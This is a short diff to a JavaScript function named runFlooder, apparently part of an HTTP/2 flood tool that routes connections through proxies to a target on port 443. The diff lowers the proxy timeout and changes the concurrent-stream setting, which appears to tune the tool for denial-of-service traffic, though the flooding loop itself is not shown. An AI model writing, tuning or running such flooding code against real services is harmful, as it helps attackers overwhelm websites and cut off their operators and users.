@@ -201,7 +201,7 @@ function runFlooder() {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
-        timeout: 5
+        timeout: 1
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
@@ -252,7 +252,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 112,
+                maxConcurrentStreams: 100,
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536,
                 enablePush: false
